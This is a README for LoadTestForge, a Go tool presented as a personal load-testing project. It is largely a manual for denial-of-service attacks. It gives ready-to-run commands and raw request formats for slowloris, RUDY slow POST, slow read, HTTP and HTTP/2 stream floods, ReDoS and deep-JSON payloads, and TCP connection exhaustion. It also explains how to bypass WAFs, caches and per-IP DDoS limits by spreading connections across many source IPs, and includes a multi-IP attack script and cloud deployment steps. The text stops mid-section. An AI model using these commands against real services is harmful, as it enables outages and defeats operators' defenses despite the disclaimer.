# LoadTestForge

A personal toy project for learning about HTTP load testing and network stress patterns. Built for educational purposes and authorized testing only.

> **IMPORTANT LEGAL DISCLAIMER**
>
> This tool is designed exclusively for **authorized security testing** and **performance validation** of systems you own or have explicit written permission to test.
>
> **Unauthorized use against systems without permission is illegal and may violate:**
> - Computer Fraud and Abuse Act (CFAA) - United States
> - Computer Misuse Act - United Kingdom
> - 정보통신망법 - South Korea
> - Similar laws in other jurisdictions
>
> **The developers assume no liability for misuse of this software. By using this tool, you acknowledge that you have obtained proper authorization and accept full responsibility for your actions.**

## Use Cases

- **Learning**: Understand how various HTTP stress patterns work
- **Personal Lab Testing**: Test your own servers and infrastructure
- **Security Research**: Study DDoS mitigation techniques (on your own systems)
- **CTF/Educational**: Capture the flag competitions and security courses

## Features

- **Multiple Load Patterns**
  - Normal HTTP load testing
  - Keep-Alive HTTP with connection reuse
  - Slow Connection Simulation (validates timeout policies)
  - Slow POST Simulation (tests request body handling)
  - Slow Read Simulation (validates response buffering)
  - High Throughput Testing (maximum request volume)
  - HTTP/2 Multiplexing Test (stream concurrency validation)
  - Parser Stress Testing (JSON/XML depth limits, regex performance)
  - Connection Pool Testing (socket limit validation)
  - Session Persistence Testing (cookie handling, keep-alive)
  - HTTPS/TLS support with certificate validation

- **Pulsing Load Patterns**
  - Square wave (instant transition between high/low load)
  - Sine wave (smooth oscillation)
  - Sawtooth wave (gradual rise, sudden drop)
  - Configurable high/low durations and ratios
  - Stress test auto-scaling systems

- **Precise Rate Control**
  - Token bucket algorithm for accurate rate limiting
  - Ramp-up support for gradual load increase
  - Target: ±10% standard deviation

- **Advanced Metrics**
  - Real-time statistics
  - Percentile analysis (p50, p95, p99)
  - Standard deviation tracking
  - Success rate monitoring
  - TCP session accuracy (goroutines vs real sockets)
  - Connection lifetime, timeout, and reconnect telemetry
  - **Automatic Pass/Fail Verdict** with configurable thresholds

- **Multi-IP Source Binding**
  - Bind outbound connections to specific network interfaces
  - Distribute load across multiple NICs or IP addresses
  - Simulate traffic from multiple client sources
  - Essential for realistic distributed load simulation

- **Production Ready**
  - Session lifetime limits (5min max)
  - Graceful shutdown
  - Context-based cancellation
  - Connection pooling

- **Keep-Alive Session Assurance**
  - Sends complete HTTP/1.1 requests before entering keep-alive loops
  - ±10% deviation alerts between requested sessions and open TCP sockets
  - Configurable slow ping intervals for 100-3000+ concurrent sessions

- **AWS Deployment**
  - Docker containerization
  - ECS Fargate support
  - CloudWatch integration

## Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/srtdog64/LoadTestForge.git
cd LoadTestForge

# Build
go build -o loadtest ./cmd/loadtest

# Or use make
make build
```

### Basic Usage

```bash
# Simple HTTP load test
./loadtest --target http://httpbin.org/get --sessions 100 --rate 10 --duration 1m

# With ramp-up
./loadtest --target http://example.com --sessions 1000 --rate 100 --rampup 30s --duration 5m

# Slowloris simulation
./loadtest --target http://example.com --strategy slowloris --sessions 500 --rate 50

# Bind to specific source IP
./loadtest --target http://example.com --sessions 2000 --rate 500 --bind-ip 192.168.1.101
```

## Command Line Options

| Flag | Default | Description |
|------|---------|-------------|
| `--target` | (required) | Target URL (http:// or https://) |
| `--strategy` | `keepalive` | Attack strategy (see below) |
| `--sessions` | `100` | Target concurrent sessions |
| `--rate` | `10` | Sessions per second to create |
| `--duration` | `0` (infinite) | Test duration (e.g., `30s`, `5m`, `1h`) |
| `--rampup` | `0` | Ramp-up duration for gradual load increase |
| `--bind-ip` | `` | Source IP address to bind outbound connections to |
| `--method` | `GET` | HTTP method |
| `--timeout` | `10s` | Request timeout |
| `--keepalive` | `10s` | Keep-alive ping interval |
| `--content-length` | `100000` | Content-Length for slow-post |
| `--read-size` | `1` | Bytes to read per iteration for slow-read |
| `--window-size` | `64` | TCP window size for slow-read |
| `--post-size` | `1024` | POST data size for http-flood |
| `--requests-per-conn` | `100` | Requests per connection for http-flood |
| `--max-streams` | `100` | Max concurrent streams per connection for h2-flood |
| `--burst-size` | `10` | Stream burst size for h2-flood |
| `--payload-type` | `deep-json` | Payload type for heavy-payload (deep-json/redos/nested-xml/query-flood/multipart) |
| `--payload-depth` | `50` | Nesting depth for heavy-payload |
| `--payload-size` | `10000` | Payload size for heavy-payload |
| `--pulse` | `false` | Enable pulsing load pattern |
| `--pulse-high` | `30s` | Duration of high load phase |
| `--pulse-low` | `30s` | Duration of low load phase |
| `--pulse-ratio` | `0.1` | Session ratio during low phase (0.1 = 10%) |
| `--pulse-wave` | `square` | Wave type (square/sine/sawtooth) |
| `--max-failures` | `5` | Max consecutive failures before session terminates |
| `--stealth` | `false` | Enable browser fingerprint headers (Sec-Fetch-*) for WAF bypass |
| `--randomize` | `false` | Enable realistic query strings for cache bypass |
| `--analyze-latency` | `false` | Enable response time percentile analysis (p50, p95, p99) |
| `--chunk-delay-min` | `1s` | Minimum delay between chunks for rudy |
| `--chunk-delay-max` | `5s` | Maximum delay between chunks for rudy |
| `--chunk-size-min` | `1` | Minimum chunk size in bytes for rudy |
| `--chunk-size-max` | `100` | Maximum chunk size in bytes for rudy |
| `--persist` | `true` | Enable persistent connections for rudy |
| `--max-req-per-session` | `10` | Maximum requests per session for rudy |
| `--keepalive-timeout` | `600s` | Keep-alive timeout for rudy |
| `--use-json` | `false` | Use JSON encoding for rudy |
| `--use-multipart` | `false` | Use multipart/form-data encoding for rudy |
| `--evasion-level` | `2` | Evasion level for rudy (1=basic, 2=normal, 3=aggressive) |

### Available Load Patterns

| Pattern | Description | Use Case |
|---------|-------------|----------|
| `normal` | Standard HTTP requests | Baseline throughput testing |
| `keepalive` | HTTP with connection reuse (default) | Realistic browser traffic simulation |
| `slowloris` | Slow connection simulation | Timeout policy validation |
| `slowloris-keepalive` | Slow connection with keep-alive | Connection pool stress testing |
| `slow-post` | Slow POST body transmission | Request timeout validation |
| `slow-read` | Slow response consumption | Response buffer limit testing |
| `http-flood` | High throughput testing | Maximum capacity validation |
| `h2-flood` | HTTP/2 stream concurrency test | HTTP/2 limit validation |
| `heavy-payload` | Parser stress testing | Input validation & parser limits |
| `rudy` | Persistent slow POST simulation | Session handling validation |
| `tcp-flood` | Connection pool exhaustion test | Socket limit validation |

## Examples

### 1. Gradual Load Test with Ramp-up

```bash
# Start at 0, reach 1000 sessions over 2 minutes, then maintain
./loadtest \
  --target https://api.example.com \
  --sessions 1000 \
  --rate 100 \
  --rampup 2m \
  --duration 10m
```

### 2. Stress Test with Percentile Analysis

```bash
# High load with detailed metrics
./loadtest \
  --target http://your-site.com \
  --sessions 5000 \
  --rate 500 \
  --duration 5m
```

Output:
```
=== LoadTestForge Live Stats ===
Elapsed Time: 2m30s

Active Sessions: 5000
Total Requests:  750000
Success:         749500 (99.93%)
Failed:          500

Requests/sec:    4998.50 (σ=45.23)
Min/Max:         4920 / 5080
Percentiles:     p50=5000, p95=5050, p99=5070

Deviation:       0.90%
Status:          ✓ Within target (±10%)
```

### 3. HTTPS Slowloris Test

```bash
# HTTPS with TLS handshake and random User-Agents
./loadtest \
  --target https://secure-site.com \
  --strategy slowloris \
  --sessions 1000 \
  --rate 200 \
  --keepalive 15s
```

### 4. Slowloris Internal Host Example

```bash
# Slowloris attack with 600 concurrent sessions against an internal HTTP service
./loadtest \
  --target http://192.168.0.100 \
  --sessions 600 \
  --strategy slowloris
```

This is the quickest way to verify the Slowloris strategy on a LAN target. You can append
`--bind-ip <local-ip>` or tweak `--rate`/`--keepalive` to match lab conditions, but the key is
setting `--strategy slowloris` alongside a valid HTTP URL.

### 5. Spike Test

```bash
# Instant spike to 10000 sessions
./loadtest \
  --target http://cdn.example.com \
  --sessions 10000 \
  --rate 2000 \
  --duration 30s
```

### 6. RUDY (R-U-Dead-Yet) Slow POST Attack

```bash
# Basic RUDY attack with default settings
./loadtest \
  --target http://example.com/login \
  --strategy rudy \
  --sessions 3000 \
  --rate 100 \
  --duration 5m

# Very slow attack with small chunks
./loadtest \
  --target http://example.com/submit \
  --strategy rudy \
  --sessions 5000 \
  --content-length 1000000 \
  --chunk-size-min 1 \
  --chunk-size-max 10 \
  --chunk-delay-min 10s \
  --chunk-delay-max 30s

# JSON-based RUDY attack with session persistence
./loadtest \
  --target https://api.example.com/v1/submit \
  --strategy rudy \
  --sessions 2000 \
  --use-json \
  --persist \
  --max-req-per-session 10

# High-evasion attack with aggressive headers
./loadtest \
  --target http://example.com/comment \
  --strategy rudy \
  --sessions 6000 \
  --evasion-level 3 \
  --randomize \
  --duration 600s
```

### 7. Multi-IP Load Distribution

```bash
# Single IP (limited to ~2,400 sessions by target DDoS protection)
./loadtest \
  --target http://example.com \
  --sessions 2000 \
  --rate 500

# Single IP binding
./loadtest \
  --target http://example.com \
  --sessions 2000 \
  --rate 500 \
  --bind-ip 192.168.1.101

# Multiple IPs with automatic round-robin distribution (NEW!)
# All connections distributed across 7 IPs automatically
./loadtest \
  --target http://example.com \
  --sessions 14000 \
  --rate 2000 \
  --bind-ip "192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.104,192.168.1.105,192.168.1.106,192.168.1.107"

# Legacy: Manual distribution across multiple processes
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.101 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.102 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.103 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.104 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.105 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.106 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.107 &
```

## Performance Targets

On a modern system (4 CPU cores, 8GB RAM):

| Sessions | Rate | Memory | CPU | Ramp-up Time |
|----------|------|--------|-----|--------------|
| 100 | 10/s | ~20MB | <5% | N/A |
| 1,000 | 100/s | ~100MB | 15-25% | 10s |
| 5,000 | 500/s | ~300MB | 40-60% | 30s |
| 10,000 | 1000/s | ~600MB | 80-100% | 1m |

### Single IP Limitations

Most target servers implement DDoS protection with per-IP connection limits:

| Scenario | Single IP | Multi-IP (7 NICs) |
|----------|-----------|-------------------|
| Target allows 2,400/IP | 2,400 sessions | ~16,800 sessions |
| Target allows 5,000/IP | 5,000 sessions | ~35,000 sessions |

## Understanding Metrics

### Test Verdict (Pass/Fail)

At the end of each test, LoadTestForge outputs an automatic Pass/Fail verdict based on the following criteria:

| Criteria | Threshold | Result |
|----------|-----------|--------|
| Success Rate | < 90% | FAIL |
| Rate Deviation | > 20% | FAIL |
| p99 Latency | > 5000ms | FAIL |
| Timeout Rate | > 10% | FAIL |

Example output:
```
=== Test Verdict ===
Result: PASS
```

Or if thresholds are exceeded:
```
=== Test Verdict ===
Result: FAIL
Failure reasons:
  - Success rate 85.50% below 90% threshold
  - Timeout rate 12.30% exceeds 10% threshold
```

### Percentiles (p50, p95, p99)

- **p50 (Median)**: 50% of sampled seconds were at or below this throughput
- **p95**: 95% of sampled seconds were at or below this throughput (typical SLA)
- **p99**: 99% of sampled seconds were at or below this throughput (tail latency)

> **Note:** `Requests/sec`, standard deviation, and percentile calculations are derived from successful requests only. Failed attempts are still counted in the Success/Failed totals but are excluded from the per-second throughput window that feeds these metrics.

### Why Percentiles Matter

Average can be misleading. Example:

```
Average: 100 req/s
p50: 98 req/s
p95: 150 req/s  ← 5% of seconds had this spike
p99: 200 req/s  ← Rare but important outliers
```

### Session Accuracy & Connection Health

- **Active Goroutines**: logical session count requested via `--sessions`.
- **TCP Connections**: actual sockets kept alive after a complete HTTP/1.1 handshake.
- **Session Accuracy**: `(TCP Connections / Active Goroutines) * 100`. Deviations above ±10% trigger a warning so you know when sockets are falling behind the requested concurrency.
- **Active Conns (tracked)**: sockets currently exchanging keep-alive pings; helps isolate stuck sessions.
- **Socket Timeouts / Reconnects**: increments when keep-alive writes or reads miss their deadlines.
- **Avg/Min/Max Conn Lifetime**: measures how long each session stayed alive (max 5 minutes by design).

> Quick validation (100세션 이하 확인):
> ```bash
> ./loadtest --target http://httpbin.org/get --sessions 50 --rate 50 --duration 30s
> ```
> TCP Connections 값이 45~55 범위(±10%)를 유지하면 Keep-Alive 기반 세션 유지가 정상적으로 이루어지고 있음을 의미합니다.

## Multi-IP Source Binding

### Why Use Multiple Source IPs?

Target servers typically implement per-IP rate limiting as DDoS protection:

```
Single IP:     2,400 sessions max (rate limited)
7 IPs (NICs):  16,800 sessions (2,400 × 7)
100 IPs:       240,000 sessions (2,400 × 100)
```

### When You Need Multi-IP

**Symptoms of IP-based rate limiting:**
- Sessions plateau at ~2,000-3,000 despite higher `--sessions` setting
- `netstat` shows high connection resets (RST packets)
- Target server logs show "rate limit exceeded" or "too many connections"

**Example:**
```bash
# Setting: 5,000 sessions
./loadtest --target http://example.com --sessions 5000 --rate 500

# Actual: Only 2,400 sessions established
# netstat shows: 113,195 connection resets

# Solution: Use multiple source IPs
```

### How to Use bind-ip

**1. Check Available Network Interfaces:**

```bash
# Linux/Mac
ip addr show

# Expected output:
# eth0: 192.168.1.101
# eth1: 192.168.1.102
# eth2: 192.168.1.103
# ...
```

**2. Single IP Binding:**

```bash
./loadtest \
  --target http://example.com \
  --sessions 2000 \
  --rate 500 \
  --bind-ip 192.168.1.101
```

**3. Multi-IP with Single Command (Recommended):**

```bash
# Comma-separated IPs - automatic round-robin distribution
./loadtest \
  --target http://example.com \
  --sessions 14000 \
  --rate 2000 \
  --bind-ip "192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.104"

# Space or semicolon separated also works
./loadtest --bind-ip "192.168.1.101 192.168.1.102 192.168.1.103"
./loadtest --bind-ip "192.168.1.101;192.168.1.102;192.168.1.103"
```

This built-in feature automatically distributes connections across all specified IPs using round-robin. No need to run multiple processes!

**4. Multi-IP Manual Distribution (Legacy):**

```bash
# Launch separate processes for each NIC (old method)
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.101 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.102 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.103 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.104 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.105 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.106 &
./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.107 &

# Monitor all processes
watch -n 1 'ps aux | grep loadtest | wc -l'
```

**5. Automated Multi-IP Script (Legacy):**

```bash
#!/bin/bash
# multi-ip-attack.sh

TARGET="http://example.com"
SESSIONS=2000
RATE=500
STRATEGY="slowloris"

# Automatically detect all available IPs
IPS=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d'/' -f1)

echo "Detected IPs:"
echo "$IPS"
echo ""

# Launch one process per IP
for ip in $IPS; do
    echo "Starting with IP: $ip"
    ./loadtest \
        --target "$TARGET" \
        --sessions "$SESSIONS" \
        --rate "$RATE" \
        --strategy "$STRATEGY" \
        --bind-ip "$ip" &
    sleep 1
done

echo "All processes launched. Press Ctrl+C to stop."
wait
```

### Verification

```bash
# Check which IPs are being used
netstat -an | grep ESTABLISHED | awk '{print $4}' | cut -d':' -f1 | sort | uniq -c

# Expected output with 7 IPs:
#   342 192.168.1.101
#   341 192.168.1.102
#   339 192.168.1.103
#   344 192.168.1.104
#   338 192.168.1.105
#   342 192.168.1.106
#   341 192.168.1.107

# Total: ~2,387 sessions across 7 IPs
```

### Important Notes

**IP Binding vs IP Spoofing:**
- `--bind-ip` uses **real, assigned IP addresses** (legitimate)
- IP spoofing uses **fake IPs** (illegal, immediately detected)
- Always use bind-ip with actual network interfaces

**Per-IP Session Limits:**
- Most servers: 2,000-3,000 sessions/IP
- High-security servers: 500-1,000 sessions/IP
- CDNs: 5,000-10,000 sessions/IP

**Performance Impact:**
- Binding overhead: <1% CPU
- No meaningful performance degradation
- Bottleneck is network bandwidth, not IP binding

## AWS Deployment

### Quick Deploy

```bash
cd deployments/aws
chmod +x deploy.sh
./deploy.sh
```

### Run One-Time Load Test

```bash
aws ecs run-task \
  --cluster loadtest-cluster \
  --launch-type FARGATE \
  --task-definition loadtest-task \
  --network-configuration "awsvpcConfiguration={
    subnets=[subnet-xxx],
    securityGroups=[sg-xxx],
    assignPublicIp=ENABLED
  }" \
  --overrides '{
    "containerOverrides": [{
      "name": "loadtest",
      "command": [
        "--target", "https://your-target.com",
        "--sessions", "5000",
        "--rate", "500",
        "--rampup", "1m",
        "--duration", "10m"
      ]
    }]
  }'
```

### View Live Logs

```bash
aws logs tail /ecs/loadtest --follow
```

## Attack Strategies Explained

LoadTestForge offers multiple attack strategies, each optimized for different testing scenarios:

### 1. Normal HTTP (`--strategy normal`)

**Purpose:** Standard HTTP load testing

**How it works:**
- Sends complete HTTP requests
- Waits for response
- Closes connection after each request
- No connection reuse

**Use case:** Testing server throughput and request handling

**Example:**
```bash
./loadtest --target http://api.example.com --sessions 1000 --rate 100 --strategy normal
```

### 2. Keep-Alive HTTP (`--strategy keepalive`, default)

**Purpose:** Realistic browser-like load testing

**How it works:**
- Sends complete HTTP requests
- Reuses TCP connections (HTTP/1.1 keep-alive)
- Multiple requests per connection
- Efficient for sustained load

**Use case:** Simulating real user traffic patterns

**Example:**
```bash
./loadtest --target http://api.example.com --sessions 1000 --rate 100 --strategy keepalive
```

### 3. Classic Slowloris (`--strategy slowloris`)

**Purpose:** DDoS simulation and defense testing

**How it works:**
- Sends **incomplete** HTTP headers (no `\r\n\r\n`)
- Never completes the request
- Target server waits indefinitely
- Periodically sends dummy headers to keep connection alive
- **No 200 OK response** (server keeps waiting)

**Technical details:**
```
Sent to server:
GET /?123 HTTP/1.1\r\n
User-Agent: Mozilla/5.0...\r\n
Accept-language: en-US,en,q=0.5\r\n
(stops here, no closing \r\n\r\n)

Then every 10s:
X-a: 4567\r\n
X-a: 8901\r\n
...
```

**Use case:**
- Testing DDoS protection mechanisms
- Validating connection timeout policies
- Stress testing connection pools
- **Bypassing simple rate limiters**

**Warning:** More aggressive, may trigger security alerts

**Example:**
```bash
./loadtest \
  --target http://192.168.0.100 \
  --sessions 2400 \
  --rate 600 \
  --strategy slowloris
```

### 4. Keep-Alive Slowloris (`--strategy slowloris-keepalive` or `keepsloworis`)

**Purpose:** Safer Slowloris variant for testing

**How it works:**
- Sends **complete** HTTP headers
- Target responds with 200 OK
- Keeps connection alive with periodic headers
- More detectable by DDoS protection

**Technical details:**
```
Sent to server:
GET / HTTP/1.1\r\n
Host: example.com\r\n
User-Agent: Mozilla/5.0...\r\n
Connection: keep-alive\r\n
\r\n
(complete request)

Server responds:
HTTP/1.1 200 OK\r\n
...

Then keep-alive headers:
X-Keep-Alive-12345: ...\r\n
```

**Use case:**
- Testing keep-alive timeout policies
- Validating connection cleanup
- Safer alternative when Classic Slowloris triggers blocks

**Example:**
```bash
./loadtest \
  --target http://example.com \
  --sessions 600 \
  --rate 100 \
  --strategy slowloris-keepalive
```

### 5. Slow POST (`--strategy slow-post`)

**Purpose:** RUDY (R-U-Dead-Yet) attack simulation

**How it works:**
- Sends POST request with large Content-Length header
- Transmits body data extremely slowly (1 byte per interval)
- Server waits for complete body, holding connection open
- Effective against servers with long POST timeouts

**Technical details:**
```
Sent to server:
POST /?12345 HTTP/1.1\r\n
Host: example.com\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 100000\r\n
\r\n
(complete headers)

Then slowly:
a (wait 10s)
b (wait 10s)
c (wait 10s)
...
```

**Use case:**
- Testing POST request timeout policies
- Bypassing GET-focused rate limiters
- Stress testing upload handlers

**Example:**
```bash
./loadtest \
  --target http://example.com/upload \
  --sessions 1000 \
  --rate 200 \
  --strategy slow-post \
  --content-length 100000
```

### 6. Slow Read (`--strategy slow-read`)

**Purpose:** Slow response consumption attack

**How it works:**
- Sends complete HTTP request
- Reads response extremely slowly (1 byte per interval)
- Sets small TCP receive window to throttle server
- Server must buffer response, consuming memory

**Technical details:**
```
Client sends:
GET / HTTP/1.1\r\n
Host: example.com\r\n
Accept-Encoding: identity\r\n  (no compression)
\r\n

Server sends response...

Client reads:
1 byte (wait 10s)
1 byte (wait 10s)
...

TCP Window: 64 bytes (very small)
```

**Use case:**
- Testing response buffering limits
- Evaluating server memory under slow clients
- Simulating mobile/slow network conditions

**Example:**
```bash
./loadtest \
  --target http://example.com/large-file \
  --sessions 500 \
  --rate 100 \
  --strategy slow-read \
  --read-size 1 \
  --window-size 64
```

### 7. HTTP Flood (`--strategy http-flood`)

**Purpose:** High-volume request flooding

**How it works:**
- Sends maximum requests as fast as possible
- Randomizes User-Agent, Referer, query parameters
- Reuses connections for efficiency
- Can use GET or POST methods

**Technical details:**
```
Rapid fire:
GET /?r=12345678&cb=987654 HTTP/1.1
GET /?r=23456789&cb=876543 HTTP/1.1
GET /?r=34567890&cb=765432 HTTP/1.1
... (100 requests per connection)

Headers randomized each request:
- User-Agent: (random from 10 browsers)
- Referer: (random from popular sites)
- Cache-Control: (random no-cache variant)
```

**Use case:**
- Testing request throughput limits
- Evaluating CDN/WAF effectiveness
- Stress testing application layer

**Example:**
```bash
# GET flood
./loadtest \
  --target http://example.com \
  --sessions 500 \
  --rate 200 \
  --strategy http-flood \
  --requests-per-conn 100

# POST flood
./loadtest \
  --target http://example.com/api \
  --sessions 500 \
  --rate 200 \
  --strategy http-flood \
  --method POST \
  --post-size 1024
```

### 8. HTTP/2 Flood (`--strategy h2-flood`)

**Purpose:** HTTP/2 multiplexing abuse attack

**How it works:**
- Opens single TCP connection with HTTP/2 negotiation
- Spawns thousands of concurrent streams on one connection
- Bypasses per-IP connection limits
- Maximizes server frame processing overhead

**Technical details:**
```
Single TCP connection with HTTP/2:
  Stream 1: GET /?r=xxx
  Stream 3: GET /?r=yyy
  Stream 5: GET /?r=zzz
  ... (100+ concurrent streams)

Bypasses:
- Per-IP connection limits
- Connection rate limiting
- Traditional firewall rules
```

**Use case:**
- Testing HTTP/2 stream limits
- Bypassing connection-based rate limiting
- CVE-2023-44487 (Rapid Reset) style testing
- Modern infrastructure stress testing

**Example:**
```bash
./loadtest \
  --target https://example.com \
  --sessions 100 \
  --rate 50 \
  --strategy h2-flood \
  --max-streams 100 \
  --burst-size 10
```

### 9. Heavy Payload (`--strategy heavy-payload`)

**Purpose:** Application-layer stress testing with CPU-intensive payloads

**How it works:**
- Sends payloads designed to maximize server-side processing cost
- Deep nested JSON/XML stress parsers
- ReDoS patterns trigger catastrophic regex backtracking
- Complex query strings stress URL parsing

**Payload Types:**

| Type | Description |
|------|-------------|
| `deep-json` | Deeply nested JSON (50+ levels) |
| `nested-xml` | Deeply nested XML with attributes |
| `redos` | Regular expression denial of service patterns |
| `query-flood` | Thousands of query parameters |
| `multipart` | Large multipart form data |

**Technical details:**
```json
// deep-json example (depth=50)
{"level0":{"level1":{"level2":{...{"data":"..."}...}}}}

// redos example (triggers backtracking)
input=aaaaaaaaaaaaaaaaaa!
email=aaaaaa@aaaaaa!

// query-flood example
?param0=aaaa...&param1=aaaa...&...&param9999=aaaa...
```

**Use case:**
- Testing JSON/XML parser limits
- Finding ReDoS vulnerabilities
- Stress testing validation logic
- Bypassing simple WAF rules

**Example:**
```bash
# Deep JSON attack
./loadtest \
  --target http://api.example.com/parse \
  --sessions 100 \
  --rate 50 \
  --strategy heavy-payload \
  --payload-type deep-json \
  --payload-depth 100

# ReDoS attack
./loadtest \
  --target http://api.example.com/validate \
  --sessions 50 \
  --rate 20 \
  --strategy heavy-payload \
  --payload-type redos \
  --payload-size 50000
```

### 10. TCP Flood (`--strategy tcp-flood`)

**Purpose:** TCP connection exhaustion attack

**How it works:**
- Rapidly creates TCP connections to exhaust server connection limits
- Holds connections open until the server closes them (infinite hold mode)
- Can optionally send a byte after connection to trigger application-layer processing
- Uses TCP keep-alive to prevent idle timeouts
- Minimal bandwidth usage, maximum connection slot consumption

**Technical details:**
```
Connection flow:
1. TCP 3-way handshake (SYN -> SYN-ACK -> ACK)
2. Optional: Send single byte (0x00)
3. Hold connection open indefinitely
4. Monitor for server-initiated close (FIN/RST)
5. Reconnect immediately when server drops

TCP Options:
- TCP_NODELAY: true (disable Nagle)
- SO_KEEPALIVE: true (60s intervals)
- Hold time: 0 (infinite) or configurable
```

**Use case:**
- Testing connection pool limits
- Exhausting server socket descriptors
- Testing firewall connection tracking
- Stress testing load balancers
- Evaluating connection timeout policies

**Example:**
```bash
# Basic TCP flood - hold connections until server closes
./loadtest \
  --target http://example.com \
  --sessions 10000 \
  --rate 500 \
  --strategy tcp-flood

# TCP flood with data send (triggers application layer)
./loadtest \
  --target https://example.com \
  --sessions 5000 \
  --rate 200 \
  --strategy tcp-flood \
  --send-data

# TCP flood with session lifetime limit (reconnect after 5 minutes)
./loadtest \
  --target http://example.com \
  --sessions 8000 \
  --rate 300 \
  --strategy tcp-flood \
  --session-lifetime 5m
```

### Pulsing Load Patterns

**Purpose:** Stress test auto-scaling systems

**How it works:**
- Oscillates load between high and low levels
- Tests scaling response time and hysteresis
- Exposes scaling lag and thrashing issues
- **Active Pruning**: Sessions are forcefully terminated during scale-down (Hard Kill)
- **Non-blocking Control Loop**: Rate-limited spawning prevents control loop blocking

**Wave Types:**

| Type | Description |
|------|-------------|
| `square` | Instant transition between high/low |
| `sine` | Smooth sinusoidal oscillation |
| `sawtooth` | Gradual rise, sudden drop |

**Technical details:**
```
Scale UP (Low -> High):
- Non-blocking: spawns only (rate * tick_interval * 1.5) sessions per 50ms tick
- Prevents control loop blocking when transitioning to thousands of sessions
- Example: rate=100/s, tick=50ms -> max 7-8 sessions/tick

Scale DOWN (High -> Low):
- Active Pruning with 50% damping factor
- Forcefully cancels excess sessions (simulates client disconnection)
- Damping prevents overshooting due to async goroutine termination
- Example: excess=900 -> prune 450 this tick, re-evaluate next tick
```

**Use case:**
- Testing auto-scaling policies
- Finding scale-up/scale-down lag
- Cloud cost optimization testing
- Chaos engineering
- Testing server behavior under sudden client disconnections

**Example:**
```bash
# Square wave: 30s at 1000 sessions, 30s at 100 sessions
./loadtest \
  --target http://example.com \
  --sessions 1000 \
  --rate 100 \
  --pulse \
  --pulse-wave square \
  --pulse-high 30s \
  --pulse-low 30s \
  --pulse-ratio 0.1 \
  --duration 10m

# Sine wave for smooth oscillation
./loadtest \
  --target http://example.com \
  --sessions 500 \
  --pulse \
  --pulse-wave sine \
  --pulse-high 1m \
  --pulse-low 1m

# Sawtooth: gradual ramp to 2000, instant drop to 200
./loadtest \
  --target http://example.com \
  --sessions 2000 \
  --rate 200 \
  --pulse \
  --pulse-wave sawtooth \
  --pulse-high 1m \
  --pulse-low 10s \
  --pulse-ratio 0.1
```

### Strategy Comparison

| Feature | Normal | Keep-Alive | Slowloris | Slow POST | Slow Read | HTTP Flood | H2 Flood | Heavy Payload | TCP Flood |
|---------|--------|------------|-----------|-----------|-----------|------------|----------|---------------|-----------|
| **Request Complete** | Yes | Yes | No | Yes | Yes | Yes | Yes | Yes | N/A |
| **Server Response** | Yes | Yes | No | No | Yes | Yes | Yes | Yes | N/A |
| **Connection Reuse** | No | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
| **Resource Exhaustion** | CPU | Connections | Connections | Connections | Memory | CPU/Bandwidth | Streams/CPU | CPU/Parser | Connections |
| **Detection Risk** | Low | Low | High | Medium | Medium | High | Medium | Low | Medium |
| **Best For** | Throughput | Real traffic | Connection pool | Upload endpoints | Large responses | Raw volume | Modern infra | App logic | Socket limits |

### When to Use Each Strategy

**Use Normal when:**
- Testing pure request throughput
- Simulating non-browser clients
- Testing connection establishment overhead

**Use Keep-Alive when:**
- Simulating real browser traffic
- Testing sustained load
- General load testing (default choice)

**Use Slowloris when:**
- Testing DDoS protection systems
- Need to bypass IP-based rate limits
- Stress testing connection pools
- Maximum sessions per IP required

**Use Slow POST when:**
- Testing upload/form handling
- Bypassing GET-focused protections
- Targeting POST-heavy APIs
- Testing request body timeout policies

**Use Slow Read when:**
- Testing response buffering
- Evaluating memory limits
- Simulating slow network clients
- Targeting large response endpoints

**Use HTTP Flood when:**
- Testing raw throughput capacity
- Evaluating WAF/CDN effectiveness
- Maximum request volume needed
- Stress testing application logic

**Use TCP Flood when:**
- Testing connection pool/socket limits
- Exhausting file descriptors on target
- Testing firewall connection tracking tables
- Evaluating load balancer connection limits
- Minimal bandwidth, maximum connection impact

## Docker Usage

### Build and Run Locally

```bash
# Build
docker build -t loadtest:latest -f deployments/docker/Dockerfile .

# Run
docker run --rm loadtest:latest \
  --target http://httpbin.org/get \
  --sessions 100 \
  --rate 10 \
  --duration 1m
```

### Docker Compose

```bash
cd deployments/docker
docker-compose up
```

## Advanced Features

### User-Agent Randomization

Slowloris strategy automatically rotates through 10 realistic User-Agents:
- Chrome (Windows, Mac, Linux)
- Firefox (Windows, Linux)
- Safari (Mac, iOS, iPad)
- Edge (Windows)
- Android Chrome

### Session Lifetime Protection

- Maximum session life: 5 minutes
- Prevents infinite connections
- Automatic cleanup on timeout

### TLS/HTTPS Support

- Proper TLS handshake
- Certificate validation enforced (self-signed certs will fail unless trusted by the OS)
- SNI support
- Works with modern HTTPS servers

## Best Practices

### 1. Always Use Ramp-up for Large Tests

```bash
# Bad: Instant spike might crash target
./loadtest --target http://api.com --sessions 10000 --rate 2000

# Good: Gradual increase
./loadtest --target http://api.com --sessions 10000 --rate 2000 --rampup 2m
```

### 2. Monitor Percentiles, Not Just Average

```
If p99 >> Average, you have:
- Network congestion
- Occasional server overload
- Resource contention
```

### 3. Start Small, Scale Up

```bash
# Step 1: Baseline
./loadtest --target http://api.com --sessions 10 --rate 1 --duration 1m

# Step 2: Increase
./loadtest --target http://api.com --sessions 100 --rate 10 --duration 2m

# Step 3: Scale
